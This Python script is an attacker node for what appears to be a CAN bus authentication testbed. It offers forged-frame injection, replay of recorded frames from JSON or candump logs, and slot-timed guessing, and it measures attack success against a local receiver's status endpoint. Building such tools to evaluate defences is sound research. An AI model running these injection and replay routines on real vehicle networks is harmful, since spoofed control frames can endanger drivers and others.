"""Attacker node with multiple modes: can_only, replay, precise_guess.

Modes:
1) can_only: injects forged CAN frames at random times (no micro-events).
2) replay: replays recorded legitimate frames (payload+tag) but without micro-gap events.
3) precise_guess: tries to guess slot timing and send frames in slots (no tag knowledge).

Supports injection rate, duration, and replay from JSON or candump logs.
Logs all sends and prints observed responses via a background listener.
"""

from __future__ import annotations

import argparse
import json
import os
import random
import threading
import time
from collections import deque
from pathlib import Path
from typing import Deque, Iterable, List, Optional

import can
from urllib import request, error as urlerror

from common import get_bus, DEFAULT_ID, PERIOD_MS, SLOT_WINDOW_MS, now_ns

QUIET = False  # set from CLI

try:
    # Optional candump reader
    from can.io import CanutilsLogReader  # type: ignore
except Exception:
    CanutilsLogReader = None  # type: ignore


def _rand_payload(n: int = 8) -> bytes:
    return bytes(random.randint(0, 255) for _ in range(n))


def _listener_thread(results: Deque[can.Message], stop: threading.Event, filter_id: Optional[int] = None) -> None:
    with get_bus() as rx_bus:
        while not stop.is_set():
            msg = rx_bus.recv(timeout=0.2)
            if msg is None:
                continue
            if filter_id is not None and msg.arbitration_id != filter_id:
                continue
            results.append(msg)


def _start_listener(filter_id: Optional[int]) -> tuple[Deque[can.Message], threading.Event, threading.Thread]:
    results: Deque[can.Message] = deque(maxlen=100)
    stop = threading.Event()
    t = threading.Thread(target=_listener_thread, args=(results, stop, filter_id), daemon=True)
    t.start()
    return results, stop, t


def run_can_only(bus: can.BusABC, target_id: int, rate_hz: float, duration_s: float) -> int:
    period = 1.0 / max(rate_hz, 0.1)
    end_time = time.time() + max(0.0, duration_s)
    results, stop, _ = _start_listener(None)
    sent = 0
    try:
        while time.time() < end_time:
            payload = _rand_payload(8)
            msg = can.Message(arbitration_id=target_id, data=payload, is_extended_id=False)
            bus.send(msg)
            sent += 1
            if not QUIET:
                print(f"[attacker] can_only send ts_ns={time.time_ns()} id=0x{target_id:X} data={payload.hex()}")
            time.sleep(period * random.uniform(0.5, 1.5))
            # Print any observed responses
            while results:
                r = results.popleft()
                if not QUIET:
                    print(f"[attacker] observed id=0x{r.arbitration_id:X} data={bytes(r.data).hex()}")
    except KeyboardInterrupt:
        pass
    finally:
        stop.set()
    return sent


def _replay_from_json(bus: can.BusABC, path: str, target_id: int, rate_hz: float, duration_s: float) -> int:
    period = 1.0 / max(rate_hz, 0.1)
    end_time = time.time() + max(0.0, duration_s)
    count = 0
    with open(path, "r") as f:
        lines = [ln.strip() for ln in f if ln.strip()]
    idx = 0
    results, stop, _ = _start_listener(None)
    try:
        while time.time() < end_time and lines:
            obj = json.loads(lines[idx])
            idx = (idx + 1) % len(lines)
            data_hex = obj.get("data_hex") or obj.get("data")
            arb_id = int(obj.get("arbitration_id", target_id))
            if not isinstance(data_hex, str):
                continue
            data = bytes.fromhex(data_hex)[:8]
            msg = can.Message(arbitration_id=arb_id, data=data, is_extended_id=False)
            bus.send(msg)
            count += 1
            if not QUIET:
                print(f"[attacker] replay-json send #{count} ts_ns={time.time_ns()} id=0x{arb_id:X} data={data.hex()}")
            time.sleep(period)
            while results:
                r = results.popleft()
                if not QUIET:
                    print(f"[attacker] observed id=0x{r.arbitration_id:X} data={bytes(r.data).hex()}")
    finally:
        stop.set()
    return count


def _replay_from_candump(bus: can.BusABC, path: str, duration_s: float) -> int:
    if CanutilsLogReader is None:
        if not QUIET:
            print("[attacker] CanutilsLogReader not available; install python-can extras to use candump replay")
        return 0
    end_time = time.time() + max(0.0, duration_s)
    results, stop, _ = _start_listener(None)
    count = 0
    try:
        with CanutilsLogReader(path) as reader:  # type: ignore
            for msg in reader:
                if time.time() >= end_time:
                    break
                if not isinstance(msg, can.Message):
                    continue
                # Send as-is
                msg.is_extended_id = False if msg.is_extended_id is None else msg.is_extended_id
                bus.send(msg)
                count += 1
                if not QUIET:
                    print(f"[attacker] replay-candump send ts_ns={time.time_ns()} id=0x{msg.arbitration_id:X} data={bytes(msg.data).hex()}")
                while results:
                    r = results.popleft()
                    if not QUIET:
                        print(f"[attacker] observed id=0x{r.arbitration_id:X} data={bytes(r.data).hex()}")
    finally:
        stop.set()
    return count


def run_replay(bus: can.BusABC, target_id: int, rate_hz: float, duration_s: float, replay_path: str, replay_format: str) -> int:
    if not replay_path or not Path(replay_path).exists():
        print("[attacker] replay path missing; aborting")
        return 0
    if replay_format == "json":
        return _replay_from_json(bus, replay_path, target_id, rate_hz, duration_s)
    elif replay_format in ("candump", "log"):
        return _replay_from_candump(bus, replay_path, duration_s)
    else:
        print(f"[attacker] unsupported replay_format: {replay_format}")
        return 0


def _align_next_slot(period_ns: int) -> int:
    n = now_ns()
    return ((n // period_ns) + 1) * period_ns


def _sleep_until_epoch(target_epoch_ns: int, base_epoch_ns: int, base_perf_ns: int) -> None:
    while True:
        now_perf = time.perf_counter_ns()
        est_epoch = base_epoch_ns + (now_perf - base_perf_ns)
        remaining_ns = target_epoch_ns - est_epoch
        if remaining_ns <= 0:
            return
        time.sleep(max(0.0, (remaining_ns - 200_000) / 1e9))


def run_precise_guess(bus: can.BusABC, target_id: int, period_ms: int, window_ms: int, duration_s: float) -> int:
    period_ns = period_ms * 1_000_000
    next_slot_ns = _align_next_slot(period_ns)
    base_epoch_ns = time.time_ns()
    base_perf_ns = time.perf_counter_ns()
    end_time = time.time() + max(0.0, duration_s)
    results, stop, _ = _start_listener(None)
    sent = 0
    try:
        while time.time() < end_time:
            _sleep_until_epoch(next_slot_ns, base_epoch_ns, base_perf_ns)
            slot_perf_start = time.perf_counter_ns()

            # Guess: send mid-window into the slot
            offset_us = max(0, (window_ms * 1000) // 2)
            target_perf = slot_perf_start + offset_us * 1_000
            while True:
                nowp = time.perf_counter_ns()
                if nowp >= target_perf:
                    break
                time.sleep(max(0.0, (target_perf - nowp) / 1e9))

            payload = _rand_payload(8)
            msg = can.Message(arbitration_id=target_id, data=payload, is_extended_id=False)
            bus.send(msg)
            sent += 1
            if not QUIET:
                print(f"[attacker] precise_guess send ts_ns={time.time_ns()} id=0x{target_id:X} data={payload.hex()} offset_us={offset_us}")

            while results:
                r = results.popleft()
                if not QUIET:
                    print(f"[attacker] observed id=0x{r.arbitration_id:X} data={bytes(r.data).hex()}")

            next_slot_ns += period_ns
    finally:
        stop.set()
    return sent


def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument("--mode", choices=["can_only", "replay", "precise_guess"], default="can_only")
    parser.add_argument("--target_id", type=lambda x: int(x, 0), default=DEFAULT_ID)
    parser.add_argument("--injection_rate", type=float, default=20.0, help="Hz for can_only or replay pacing")
    parser.add_argument("--duration", type=float, default=10.0, help="Seconds to run")
    parser.add_argument("--replay_path", type=str, default="", help="Path to JSON or candump log")
    parser.add_argument("--replay_format", choices=["json", "candump", "log"], default="json")
    parser.add_argument("--period_ms", type=int, default=PERIOD_MS, help="Slot period for precise_guess")
    parser.add_argument("--window_ms", type=int, default=SLOT_WINDOW_MS, help="Slot window for precise_guess")
    parser.add_argument("--status_host", type=str, default="127.0.0.1")
    parser.add_argument("--status_port", type=int, default=8081)
    parser.add_argument("--wait_status", type=float, default=10.0, help="Seconds to wait for /status before giving up")
    parser.add_argument("--asr_soft", type=float, default=0.10, help="Soft success threshold (e.g., 0.05 or 0.10)")
    parser.add_argument("--asr_hard", type=float, default=0.50, help="Hard success threshold (e.g., 0.50 or 0.90)")
    parser.add_argument("--compute_asr", action="store_true", help="Fetch /status at end and print ASR")
    parser.add_argument("--quiet", action="store_true", help="Suppress send/observe logs")
    parser.add_argument("--asr_only", action="store_true", help="When computing ASR, print only the numeric percentage")
    parser.add_argument("--print_sent", action="store_true", help="Print only the number of frames sent this run at the end")
    args = parser.parse_args()

    global QUIET
    QUIET = bool(args.quiet)

    sent_total = 0
    run_start_ns = time.time_ns()
    with get_bus() as bus:
        if not QUIET:
            print(f"[attacker] mode={args.mode} target_id=0x{args.target_id:X} on {bus.channel_info}")
        try:
            if args.mode == "can_only":
                sent_total = run_can_only(bus, args.target_id, args.injection_rate, args.duration)
            elif args.mode == "replay":
                sent_total = run_replay(bus, args.target_id, args.injection_rate, args.duration, args.replay_path, args.replay_format)
            elif args.mode == "precise_guess":
                sent_total = run_precise_guess(bus, args.target_id, args.period_ms, args.window_ms, args.duration)
        except KeyboardInterrupt:
            print("[attacker] Stopped")

    # Optional ASR computation
    if args.compute_asr:
        status_url = f"http://{args.status_host}:{args.status_port}/status"
        try:
            # Retry/backoff with deadline
            body = None
            deadline = time.time() + max(0.0, float(args.wait_status))
            while time.time() < deadline:
                try:
                    with request.urlopen(status_url, timeout=1.0) as resp:
                        body = resp.read()
                    break
                except urlerror.URLError:
                    time.sleep(0.3)
            if body is None:
                raise urlerror.URLError("timeout waiting for receiver /status")
            records = json.loads(body.decode("utf-8"))
            attack_id = int(args.target_id)
            # Filter to this attack id
            id_records = [r for r in records if int(r.get("arb_id", r.get("id", -1))) == attack_id]
            # Further filter to records during this run only (by receiver timestamp)
            session_records = [r for r in id_records if int(r.get("ts_ns", 0)) >= run_start_ns]
            accept_session = sum(1 for r in session_records if r.get("verdict") == "ACCEPT")
            # Denominator: frames we attempted to spoof in this run
            denom = sent_total
            asr = (accept_session / denom) if denom > 0 else 0.0
            if asr >= args.asr_hard:
                asr_label = "HIGHLY SUCCESSFUL / CATASTROPHIC"
            elif asr >= args.asr_soft:
                asr_label = "PARTIALLY SUCCESSFUL"
            else:
                asr_label = "UNSUCCESSFUL"
            if args.asr_only:
                # Print only the numeric percentage (no label)
                print(f"{asr*100:.1f}")
            else:
                print(
                    f"[attacker] ASR summary: attack_id=0x{attack_id:X} sent_this_run={sent_total} accepted_this_run={accept_session} "
                    f"ASR={asr*100:.1f}% -> {asr_label}"
                )
        except (urlerror.URLError, TimeoutError, ConnectionError, json.JSONDecodeError) as e:
            print(f"[attacker] Could not fetch status from {status_url}: {e}")
            if args.asr_only:
                # Ensure numeric output even on failure
                print("0.0")

    # Optional print of sent count (independent of ASR)
    if args.print_sent:
        print(f"{sent_total}")


if __name__ == "__main__":
    main()
